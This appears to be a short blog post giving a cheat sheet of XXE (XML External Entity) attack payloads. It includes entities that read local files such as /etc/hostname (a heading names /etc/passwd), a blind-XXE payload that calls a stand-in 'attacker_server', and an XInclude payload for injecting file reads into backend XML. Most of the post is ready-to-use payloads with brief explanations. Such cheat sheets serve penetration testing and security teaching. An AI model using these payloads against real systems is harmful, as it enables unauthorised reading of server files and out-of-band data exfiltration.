+++
categories = ["Web Hacking"]
date = "2021-02-17"
description = ""
featured = ""
featuredalt = ""
featuredpath = "date"
linktitle = ""
title = ""
slug = ""
type = "post"
tag = "web"
+++

## Cheatsheet for XXE attacks

Detection:

```<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE example [
  <!ENTITY file "Hello!">
 ]>
 <example>&file;</example> 
 ```

Check for /etc/passwd using SYSTEM keyword

``` <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///example.txt">
 ]>
 <example>&file;</example>
 ```

When the SYSTEM keyword does not work, you can replace it with the
PUBLIC keyword instead. This tag requires you to supply an ID surrounded by
quotes after the PUBLIC keyword. The parser uses this to generate an alternate
URL for the value of the entity. For our purposes, you can just use a random
string in its place

``` <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE example [
  <!ENTITY test PUBLIC "abc" "file:///etc/hostname">
 ]>
 <example>&test;</example>
 ```

Testing for blind XXE:

``` <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
 ]>
 <example>&test;</example>
 ```

Test for XInclude Attacks
Sometimes you cannot control the entire XML document or edit the DTD
of an XML document. But you can still exploit an XXE vulnerability if the
target application takes your user input and inserts it into XML documents
on the backend.
In this situation, you might be able to execute an XInclude attack instead.
XInclude is a special XML feature that builds a separate XML document from
a single XML tag named xi:include. If you can control even a single piece of
unsanitized data passed into an XML document, you might be able to place
an XInclude attack within that value.
To test for XInclude attacks, insert the following payload into the
data entry point and see if the file that you requested gets sent back in the
response body:

```<example xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
 </example>
 ```

